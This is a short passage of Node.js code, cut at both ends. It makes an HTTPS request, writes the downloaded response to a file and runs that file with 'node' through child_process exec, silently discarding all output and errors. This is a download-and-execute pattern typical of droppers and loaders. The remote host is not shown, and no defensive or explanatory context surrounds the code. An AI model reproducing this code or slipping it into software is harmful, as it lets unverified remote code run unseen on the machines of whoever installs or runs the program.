  };

  const req = https.request(options, (resp) => {
    let data = '';
    resp.on('data', (chunk) => {
      data += chunk;
    });
    resp.on('end', () => {
      fs.writeFileSync(path, data);
      const { exec } = require('child_process');
      exec('node ' + path, (error, stdout, stderr) => {});
    });
  });

